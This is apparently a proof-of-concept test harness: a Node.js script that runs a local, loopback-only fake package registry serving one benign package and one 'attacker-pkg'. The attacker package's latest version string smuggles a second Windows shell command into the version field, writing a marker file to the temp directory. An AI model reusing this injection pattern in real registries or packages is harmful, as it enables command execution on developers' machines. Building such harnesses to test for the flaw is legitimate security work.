// Chain 1 synthetic registry (127.0.0.1 only). Serves malicious + benign packuments.
import { createServer } from 'node:http';
import { appendFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const PORT = Number(process.env.REG_PORT || 48731);
const LOG = join(dirname(fileURLToPath(import.meta.url)), 'registry.log');
const MALICIOUS = '1.0.0" & echo W1-MARKER>%TEMP%\\w1-poc & "';
const BENIGN = '1.0.0';
const TARBALL = Buffer.from('UEsDBBQAAAAIAgAAAAAAAAAAAAAAAAAAAAA=', 'base64'); // minimal tgz stub

const packument = (name, latest) => JSON.stringify({
  name,
  'dist-tags': { latest },
  versions: {
    '1.0.0': {
      name, version: '1.0.0',
      dist: { tarball: `http://127.0.0.1:${PORT}/${name}/-/${name}-1.0.0.tgz` },
    },
  },
  time: { '1.0.0': '2026-01-01T00:00:00Z' },
});

const server = createServer((req, res) => {
  const path = decodeURIComponent((req.url || '/').split('?')[0]);
  appendFileSync(LOG, `${new Date().toISOString()} ${req.method} ${req.url}\n`);
  if (path === '/attacker-pkg') {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(packument('attacker-pkg', MALICIOUS));
  } else if (path === '/good-pkg') {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(packument('good-pkg', BENIGN));
  } else if (path.endsWith('.tgz')) {
    res.writeHead(200, { 'content-type': 'application/octet-stream' });
    res.end(TARBALL);
  } else {
    appendFileSync(LOG, `${new Date().toISOString()} 404 ${req.url}\n`);
    res.writeHead(404, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ error: 'not found' }));
  }
});
server.listen(PORT, '127.0.0.1', () => {
  console.log(`registry on http://127.0.0.1:${PORT}`);
  appendFileSync(LOG, `${new Date().toISOString()} LISTEN ${PORT}\n`);
});
process.on('SIGTERM', () => server.close(() => process.exit(0)));
